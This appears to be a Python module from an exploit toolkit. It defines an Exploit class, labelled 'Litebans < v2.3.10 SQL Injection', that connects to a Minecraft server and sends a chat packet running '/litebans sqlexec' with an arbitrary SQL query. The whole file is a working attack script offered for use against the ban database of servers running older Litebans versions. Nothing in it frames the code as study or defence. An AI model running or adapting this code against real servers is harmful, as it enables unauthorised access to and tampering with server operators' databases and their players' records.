from minecraft.networking.connection import Connection
import minecraft.networking.packets


class Exploit:
    """Exploit schema"""

    def __init__(self, client: Connection = None, query: str = None):
        self.name = "Litebans < v2.3.10 SQL Injection"
        self.description = "Execute SQL queries on Litebans DB."
        self.query = query
        self.client = client
        self.success = False

    def onJoin(self, dog):
        print('Connected', dog)

    def waitForResponse(self, chat_packet):
        print("Message (%s): %s" % (chat_packet.field_string('position'), chat_packet.json_data))

    def execute(self) -> tuple[bool, str]:
        self.client.register_packet_listener(
            self.waitForResponse, minecraft.networking.packets.ChatMessagePacket)  #: on chat, receive event

        self.client.register_packet_listener(
            self.onJoin, minecraft.networking.packets.JoinGamePacket)

        self.client.connect()

        input('Press enter joined.')

        packet = minecraft.networking.packets.ChatPacket()  #: chat packet structure
        packet.message = "/litebans sqlexec {}".format(self.query)  #: assigns packet sql query
        self.client.write_packet(packet)  #: sends message

        input('Press enter wen response.')

        return True, "Success in Message"
